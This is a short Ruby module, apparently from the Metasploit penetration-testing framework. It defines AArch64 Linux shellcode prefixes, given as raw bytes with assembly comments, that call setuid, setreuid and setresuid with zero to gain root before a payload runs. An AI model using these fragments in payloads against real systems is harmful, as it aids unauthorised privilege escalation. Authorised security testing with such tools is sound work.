#
# Linux aarch64 prepends
#
module Msf::Payload::Linux::Aarch64::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      # 'PrependFork' =>  "",

      # setuid(0)
      'PrependSetuid' => "\xe0\x03\x1f\xaa" + # mov   x0, xzr
        "\x48\x12\x80\xd2" +  # mov   x8, #0x92
        "\x01\x00\x00\xd4",   # svc   0x0

      # setreuid(0, 0)
      'PrependSetreuid' => "\xe0\x03\x1f\xaa" + # mov   x0, xzr
        "\xe1\x03\x1f\xaa" +  # mov   x1, xzr
        "\x28\x12\x80\xd2" +  # mov   x8, #0x91
        "\x01\x00\x00\xd4",   # svc   0x0

      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\xe0\x03\x1f\xaa" + # mov   x0, xzr
        "\xe1\x03\x1f\xaa" +  # mov   x1, xzr
        "\xe2\x03\x1f\xaa" +  # mov   x2, xzr
        "\x68\x12\x80\xd2" +  # mov   x8, #0x93
        "\x01\x00\x00\xd4"    # svc   0x0
    }
  end

  def appends_map
    {}
  end
end
